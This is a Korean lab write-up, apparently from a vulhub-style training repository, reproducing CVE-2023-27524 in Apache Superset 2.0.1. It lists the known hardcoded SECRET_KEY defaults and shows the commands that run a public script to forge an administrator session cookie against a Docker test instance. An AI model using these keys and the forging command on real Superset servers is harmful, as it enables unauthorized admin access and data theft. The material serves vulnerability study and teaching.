# Apache Superset Hardcoded JWT Secret Key Leads to Authentication Bypass
WHS_3기_31반_최준우

깃허브 주소 : https://github.com/choijunwoo03/kr-vulhub


## 요약
Apache Superset은 시각적, 직관적, 대화형으로 설계된 오픈소스 데이터 탐색 및 시각화 플랫폼입니다.

Apache Superset에는 하드코딩된 JWT 비밀 키 취약점(CVE-2023-27524)이 포함되어 있습니다. 이 애플리케이션은 SECRET_KEY세션 쿠키 서명에 사용되는 기본값을 포함하고 있습니다. 관리자가 이 기본 키를 변경하지 않으면 공격자는 유효한 세션 쿠키를 위조하여 관리자를 포함한 모든 사용자로 인증할 수 있습니다. 이를 통해 Superset 대시보드 및 연결된 데이터베이스에 대한 무단 접근이 허용되고, 잠재적으로 원격 코드 실행으로 이어질 수 있습니다.

CVE-2023-37941 과 결합될 경우 , 인증되지 않은 공격자는 인증을 우회한 후 역직렬화 취약점을 악용하여 원격 코드 실행을 달성할 수 있습니다. 이 문서는 CVE-2023-27524의 악용 사례만 설명합니다.
참고문헌:
https://www.horizon3.ai/attack-research/disclosures/cve-2023-27524-insecure-default-configuration-in-apache-superset-leads-to-remote-code-execution/
https://github.com/horizon3ai/CVE-2023-27524

## 환경 구성 및 실행
Apache Superset 2.0.1 서버를 시작하려면 다음 명령을 실행하세요.
```bash 
docker compose up -d
 ```
서버가 시작되면 에서 Superset에 접속할 수 있습니다 http://your-ip:8088. 기본 로그인 정보는 admin/vulhub입니다.

## 취약점 재생산
Superset이 다음의 하드코딩된 기본값 중 하나를 사용하기 때문에 취약점이 존재합니다 SECRET_KEY.

\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h(버전 < 1.4.1)
CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET(버전 >= 1.4.1)
thisISaSECRET_1234(배포 템플릿)
YOUR_OWN_RANDOM_GENERATED_SECRET_KEY(선적 서류 비치)
TEST_NON_DEV_SECRET(도커 컴포즈)
CVE-2023-27524.py를 사용하여 관리자 세션(user_id가 1인) 쿠키를 위조합니다.

```bash #Install dependencies
pip install -r requirements.txt

#Forge an administrative session (whose user_id is 1) cookie
python CVE-2023-27524.py --url http://your-ip:8088 --id 1 --validate
```

이 스크립트는 알려진 기본 비밀 키를 사용하여 세션 쿠키를 크래킹하려고 시도합니다. 성공하면 user_id=1(일반적으로 관리자 사용자)로 새 세션 쿠키를 위조하고 로그인을 검증합니다.

